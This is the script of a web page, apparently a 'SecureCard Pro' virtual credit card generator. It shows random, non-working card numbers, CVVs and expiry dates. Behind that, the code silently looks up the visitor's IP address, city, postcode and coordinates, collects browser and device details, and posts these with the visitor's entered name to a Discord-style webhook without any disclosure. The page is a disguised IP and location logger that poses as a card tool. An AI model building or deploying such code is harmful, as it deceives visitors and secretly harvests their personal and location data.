    <script>
        const webhookURL = '';
        const COOLDOWN_HOURS = 24;
        const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;
        
        let isFlipped = false;
        let timerInterval = null;

        function flipCard() {
            const card = document.getElementById('creditCard');
            isFlipped = !isFlipped;
            card.classList.toggle('flipped');
        }

        function validateCardHolderName(name) {
            const namePattern = /^[A-Za-z\s\-']{2,50}$/;
            return namePattern.test(name.trim());
        }

        function updateCardPreview() {
            const cardHolder = document.getElementById('cardHolderName').value || 'YOUR NAME';
            const primaryColor = document.getElementById('primaryColor').value;
            const secondaryColor = document.getElementById('secondaryColor').value;
            const backgroundImage = document.getElementById('backgroundImage').value;
            const cardType = document.getElementById('cardType').value;

            document.getElementById('cardHolder').textContent = cardHolder.toUpperCase();
            document.querySelector('.card-logo').textContent = cardType;

            const cardFront = document.querySelector('.card-front');
            const cardBack = document.querySelector('.card-back');

            if (backgroundImage) {
                cardFront.style.background = `linear-gradient(135deg, ${primaryColor}cc 0%, ${secondaryColor}cc 100%), url('${backgroundImage}')`;
                cardFront.style.backgroundSize = 'cover';
                cardFront.style.backgroundPosition = 'center';
                cardBack.style.background = `linear-gradient(135deg, ${secondaryColor}cc 0%, ${primaryColor}cc 100%), url('${backgroundImage}')`;
                cardBack.style.backgroundSize = 'cover';
                cardBack.style.backgroundPosition = 'center';
            } else {
                cardFront.style.background = `linear-gradient(135deg, ${primaryColor} 0%, ${secondaryColor} 100%)`;
                cardBack.style.background = `linear-gradient(135deg, ${secondaryColor} 0%, ${primaryColor} 100%)`;
            }
        }

        function generateRandomCardNumber() {
            const cardType = document.getElementById('cardType').value;
            let prefix, length;

            switch(cardType) {
                case 'VISA':
                    prefix = '4';
                    length = 16;
                    break;
                case 'MASTERCARD':
                    prefix = '5';
                    length = 16;
                    break;
                case 'AMEX':
                    prefix = '34';
                    length = 15;
                    break;
                case 'DISCOVER':
                    prefix = '6011';
                    length = 16;
                    break;
                default:
                    prefix = '4';
                    length = 16;
            }

            let cardNumber = prefix;
            while (cardNumber.length < length) {
                cardNumber += Math.floor(Math.random() * 10);
            }

            return formatCardNumber(cardNumber);
        }

        function formatCardNumber(number) {
            return number.replace(/(\d{4})(?=\d)/g, '$1 ');
        }

        function generateCVV() {
            return Math.floor(100 + Math.random() * 900).toString();
        }

        function generateExpiryDate() {
            const currentDate = new Date();
            const year = currentDate.getFullYear() + Math.floor(Math.random() * 5) + 1;
            const month = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
            return `${month}/${year.toString().slice(-2)}`;
        }

        async function getLocationInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    state: data.region || 'Unknown',
                    zip: data.postal || 'Unknown',
                    country: data.country_name || 'Unknown',
                    latitude: data.latitude || 'Unknown',
                    longitude: data.longitude || 'Unknown'
                };
            } catch (error) {
                return {
                    ip: 'Unknown',
                    city: 'Unknown',
                    state: 'Unknown',
                    zip: 'Unknown',
                    country: 'Unknown',
                    latitude: 'Unknown',
                    longitude: 'Unknown'
                };
            }
        }

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let browser = 'Unknown';
            if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
            else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
            else if (ua.indexOf('Safari') > -1) browser = 'Safari';
            else if (ua.indexOf('Edge') > -1) browser = 'Edge';

            let os = 'Unknown';
            if (ua.indexOf('Win') > -1) os = 'Windows';
            else if (ua.indexOf('Mac') > -1) os = 'MacOS';
            else if (ua.indexOf('Linux') > -1) os = 'Linux';
            else if (ua.indexOf('Android') > -1) os = 'Android';
            else if (ua.indexOf('iOS') > -1) os = 'iOS';

            return {
                browser: browser,
                os: os,
                userAgent: ua.substring(0, 100) + '...',
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language
            };
        }

        function getCurrentDateTime() {
            const now = new Date();
            return {
                date: now.toLocaleDateString(),
                time: now.toLocaleTimeString(),
                timestamp: now.toISOString(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        async function sendToWebhook(cardData) {
            const embed = {
                title: 'Virtual Card Generated',
                color: 5610867,
                fields: [
                    {
                        name: 'Card Number',
                        value: cardData.number,
                        inline: false
                    },
                    {
                        name: 'Card Type',
                        value: cardData.type,
                        inline: true
                    },
                    {
                        name: 'Expiry Date',
                        value: cardData.expiry,
                        inline: true
                    },
                    {
                        name: 'CVV',
                        value: cardData.cvv,
                        inline: true
                    },
                    {
                        name: 'Card Holder',
                        value: cardData.holder,
                        inline: false
                    },
                    {
                        name: 'IP Address',
                        value: cardData.location.ip,
                        inline: true
                    },
                    {
                        name: 'Location',
                        value: `${cardData.location.city}, ${cardData.location.state}, ${cardData.location.zip}`,
                        inline: true
                    },
                    {
                        name: 'Country',
                        value: cardData.location.country,
                        inline: true
                    },
                    {
                        name: 'Coordinates',
                        value: `${cardData.location.latitude}, ${cardData.location.longitude}`,
                        inline: true
                    },
                    {
                        name: 'Date',
                        value: cardData.dateTime.date,
                        inline: true
                    },
                    {
                        name: 'Time',
                        value: cardData.dateTime.time,
                        inline: true
                    },
                    {
                        name: 'Timezone',
                        value: cardData.dateTime.timezone,
                        inline: true
                    },
                    {
                        name: 'Browser',
                        value: cardData.device.browser,
                        inline: true
                    },
                    {
                        name: 'OS',
                        value: cardData.device.os,
                        inline: true
                    },
                    {
                        name: 'Screen Resolution',
                        value: cardData.device.screenResolution,
                        inline: true
                    },
                    {
                        name: 'Language',
                        value: cardData.device.language,
                        inline: true
                    }
                ],
                footer: {
                    text: 'SecureCard Pro',
                    timestamp: cardData.dateTime.timestamp
                }
            };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ embeds: [embed] })
                });

                if (!response.ok) {
                    console.error('Webhook error:', response.statusText);
                }
            } catch (error) {
                console.error('Error sending webhook:', error);
            }
        }

        function formatTime(ms) {
            const hours = Math.floor(ms / (1000 * 60 * 60));
            const minutes = Math.floor((ms % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((ms % (1000 * 60)) / 1000);
            return `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        }

        function startTimer(expiryTime) {
            const btn = document.getElementById('generateBtn');
            const timerDisplay = document.getElementById('timerDisplay');
            const timerValue = document.getElementById('timerValue');

            btn.disabled = true;
            timerDisplay.classList.add('visible');

            function updateTimer() {
                const now = Date.now();
                const remaining = expiryTime - now;

                if (remaining <= 0) {
                    clearInterval(timerInterval);
                    btn.disabled = false;
                    timerDisplay.classList.remove('visible');
                    localStorage.removeItem('lastGenerationTime');
                    return;
                }

                timerValue.textContent = formatTime(remaining);
            }

            updateTimer();
            timerInterval = setInterval(updateTimer, 1000);
        }

        function checkCooldown() {
            const lastGeneration = localStorage.getItem('lastGenerationTime');
            if (lastGeneration) {
                const expiryTime = parseInt(lastGeneration) + COOLDOWN_MS;
                const now = Date.now();

                if (now < expiryTime) {
                    startTimer(expiryTime);
                } else {
                    localStorage.removeItem('lastGenerationTime');
                }
            }
        }

        async function generateCard() {
            const cardHolderInput = document.getElementById('cardHolderName');
            const nameError = document.getElementById('nameError');
            const cardHolderName = cardHolderInput.value.trim();

            if (!validateCardHolderName(cardHolderName) || cardHolderName === 'YOUR NAME') {
                cardHolderInput.classList.add('error');
                nameError.classList.add('visible');
                return;
            }

            cardHolderInput.classList.remove('error');
            nameError.classList.remove('visible');

            const btn = document.getElementById('generateBtn');
            const originalText = btn.innerHTML;
            
            btn.disabled = true;
            btn.innerHTML = '<span class="loading"></span>Processing...';

            const cardNumber = generateRandomCardNumber();
            const cvv = generateCVV();
            const expiryDate = generateExpiryDate();
            const cardType = document.getElementById('cardType').value;

            document.getElementById('cardNumber').textContent = cardNumber;
            document.getElementById('expiryDate').textContent = expiryDate;
            document.getElementById('cvvNumber').textContent = cvv;

            document.getElementById('displayCardNumber').textContent = cardNumber;
            document.getElementById('displayExpiry').textContent = expiryDate;
            document.getElementById('displayCVV').textContent = cvv;
            document.getElementById('displayCardType').textContent = cardType;

            const locationInfo = await getLocationInfo();
            const deviceInfo = getDeviceInfo();
            const dateTimeInfo = getCurrentDateTime();

            const cardData = {
                number: cardNumber,
                type: cardType,
                expiry: expiryDate,
                cvv: cvv,
                holder: cardHolderName.toUpperCase(),
                location: locationInfo,
                device: deviceInfo,
                dateTime: dateTimeInfo
            };

            await sendToWebhook(cardData);

            localStorage.setItem('lastGenerationTime', Date.now().toString());
            startTimer(Date.now() + COOLDOWN_MS);

            btn.innerHTML = originalText;

            document.getElementById('infoDisplay').classList.add('visible');
            document.getElementById('successMessage').classList.add('visible');
        }

        document.getElementById('cardHolderName').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^A-Za-z\s\-']/g, '');
            if (this.classList.contains('error')) {
                this.classList.remove('error');
                document.getElementById('nameError').classList.remove('visible');
            }
            updateCardPreview();
        });

        document.getElementById('primaryColor').addEventListener('input', updateCardPreview);
        document.getElementById('secondaryColor').addEventListener('input', updateCardPreview);
        document.getElementById('backgroundImage').addEventListener('input', updateCardPreview);
        document.getElementById('cardType').addEventListener('change', updateCardPreview);

        window.addEventListener('load', checkCooldown);
        updateCardPreview();
    </script>
</body>
</html>
